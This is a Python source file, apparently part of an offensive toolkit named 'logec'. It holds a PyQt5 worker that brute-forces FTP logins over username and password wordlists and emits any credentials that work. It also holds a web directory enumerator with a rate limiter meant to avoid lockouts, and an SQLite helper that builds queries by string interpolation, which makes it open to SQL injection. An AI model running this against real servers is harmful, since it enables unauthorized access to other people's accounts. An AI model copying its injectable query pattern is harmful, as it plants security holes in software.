from PyQt5.QtCore import QRunnable, Qt, QThreadPool, QObject, QThread, pyqtSignal
from concurrent.futures import ThreadPoolExecutor
import paramiko
import time
import random
import requests
import numpy as np
import sqlite3
import os

## Connection Libs
from ftplib import FTP


import Modules.General.utility as utility

## Use Yeild for progress updates to the bar


class Bruteforce(QObject):
    finished = pyqtSignal()
    progress = pyqtSignal(int)
    goodcreds = pyqtSignal(list)    
    
    live_attempts = pyqtSignal(str) 

    def __init__(self, parent=None):
        super().__init__(parent)
        
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.good_creds = []
        
        self.bruteforce_progress = 0
        self.number = 0

    def success(self, username, password):
        ## Done as a tuple to reduce mem size + so it can be appended
        self.good_creds.append((username, password))
        self.goodcreds.emit(self.good_creds)
        
    def fileopen(self, dir):
        import chardet
        
        with open(dir,"rb") as file_bytes:
            file_read_bytes = file_bytes.read()
            
            encoding= chardet.detect(file_read_bytes)
            decode_type =  encoding['encoding']
            print(decode_type)
            
            file = file_read_bytes.decode(decode_type)
            #file = file_raw.decode('utf-8')
            return file
    
    def bruteforce_framework(self, input_list):
        print("STARTED BF")
        
        #self.GUI.ERROR("low", "error","something")
        
        self.Date = utility.Timestamp.UTC_Date()
        self.Time = utility.Timestamp.UTC_Time()
        
        ## Breaking the list up
        ip = input_list[0]
        port = input_list[1]
        protocol = input_list[2]
        user_wordlist_dir = input_list[3]
        pass_wordlist_dir = input_list[4]
        url_wordlist_dir = input_list[5]
        
        
        user_list = []
        self.pass_list = []
        self.dir_list = []
        
        
        ## Results list
        self.results_dir_list = []
        
        ## Generating lists
        '''
        if user_wordlist_dir != '':
            with open(user_wordlist_dir, "r") as u_w:
                for i in u_w:
                    user_list.append(i)'''
                    
        '''if pass_wordlist_dir != '':
            with open(pass_wordlist_dir, "r") as p_w:
                for i in p_w:
                    self.pass_list.append(i)'''
                    
        '''if url_wordlist_dir != '':
            with open(url_wordlist_dir, "r") as dir:
                try:
                    for i in dir:
                        self.dir_list.append(i.replace("\n",""))
                except:
                    #self.GUI.ERROR(f"Bad Character: '{i}'", "Low", "?")
                    print("BAD CHAR")'''
        
        ## Creating target list - I know I could just use the input_list, however this cuts down on the amount of arguments I need to enter in each method
        target_list = [input_list[0], input_list[1]]
        
        ## Threadpool exercutor, also doing decisions here instead of in logec-attack like some other modules
        with ThreadPoolExecutor() as executor:
            if protocol == "HTTP":
                # Doing this per username - aka for each username it's gonna start a new worker
                webdir_thread = [executor.submit(self.webdir, target_list, dir) for dir in self.dir_list]
                #print(self.dir_list)
                for _webdir_thread in webdir_thread:
                    _webdir_thread.result()
                print("DONE")
                
            elif protocol == "FTP":
                ## lazy imports for speed
                import itertools
                    
                
                username = self.fileopen(user_wordlist_dir)
                password = self.fileopen(pass_wordlist_dir)
                
                self.total_combos = len(username.split()) * len(password.split())
                
                userpass_combo = itertools.product(username.split(),password.split())
                
                print("Combos Generated")
                
                ## For loop to cut down on memory + to make alot of executor threads
                #for creds in userpass_combo:
                    #ftp_thread = executor.submit(self.ftp, target_list, creds)
                #ftp_thread = [executor.submit(self.ftp, target_list, creds) for creds in userpass_combo]

                #print("Running Thread")
                #for _ftp_thread in ftp_thread:
                   # _ftp_thread.result()
                
                for creds in userpass_combo:
                    self.ftp(target_list, creds)
                
                print("DONE BRUTEFORCING")
                
                
                ## db write
                ## clean lists
    
    
    def ftp(self, target_list, creds):
        IP = target_list[0]
        username = creds[0]
        password = creds[1]
        
        try:
            ftp = FTP(IP, timeout=.1)
            ftp.login(username, password)
            ftp.close() ## Close is a bit harsher than quit, but quits it asap
            
            self.success(username, password)
                        
        except Exception as e:
            pass

        
        
        self.bruteforce_progress = self.bruteforce_progress + 1
        self.progress.emit(int(self.bruteforce_progress / self.total_combos * 100))  
        
        ## Live update in GUI
        self.number = self.number + 1
        if self.number == 1:
            self.live_attempts.emit(username + ":" + password)
            self.number = 0
        

    ## this does not go in the creds gui, but in the webdir one
    def webdir(self, target_list, dir):
        #target list = [ip, port]
        ## Rate limiter so you don't get kicked out
        time.sleep(np.random.uniform(.001,.01)) 
        
        base_url = target_list[0]
        
        if target_list[1] == None:
            target_list[1] = 80
        
        target_url = f"http://{base_url}:{target_list[1]}/{dir}"
        r = requests.get(target_url)
        
        print(target_url)
        
        if r.status_code == 200:
            ##Successlist.append(target_url or somthing)
            
            
            #print(target_url)
            #self.results_dir_list
            
            '''
            database_write(
                self.GUI,
                [
                    target_url,
                    base_url,
                    target_list[1],
                    r.status_code,
                    self.Date,
                    self.Time
                ])'''

        
        #pass
        # requests module, or something faster
        
        ## if code != 404:
            ##list.append(dir)



## May need to return list of things to write via a signal to prevet error
def database_write(GUI, db_input_list):
    try:
        ## Accesing DB in root dir
        bruteforce_sqliteConnection = sqlite3.connect(os.path.dirname(__file__) + '/../../logec_db')
        cursor = bruteforce_sqliteConnection.cursor()
        print("Successfully Connected to SQLite")
        
        ## QUick Data Fixes:


        sqlite_insert_query = f"""INSERT INTO 'BRUTEFORCE-http' (URL, IP, PORT, CODE, DATE, TIME) 
        VALUES
        ('{db_input_list[0]}','{db_input_list[1]}','{db_input_list[2]}','{db_input_list[3]}','{db_input_list[4]}','{db_input_list[5]}')""" ## idfk - had to manually set the '' for some reason
        
        print(sqlite_insert_query)

        #count = cursor.execute(sqlite_insert_query)
        cursor.execute(sqlite_insert_query)
        bruteforce_sqliteConnection.commit()
        cursor.close()
        
    except sqlite3.Error as error:
        GUI.ERROR(error, "Medium", "?")
        print("Failed to insert data into sqlite table", error)
        
    finally:
        if bruteforce_sqliteConnection:
            bruteforce_sqliteConnection.close()
            #print("The SQLite connection is closed")

##B = Bruteforce()

##B.framework(["127.0.0.1","22","webdir","userlist","passlist"])

## holy f ssh is picky as hell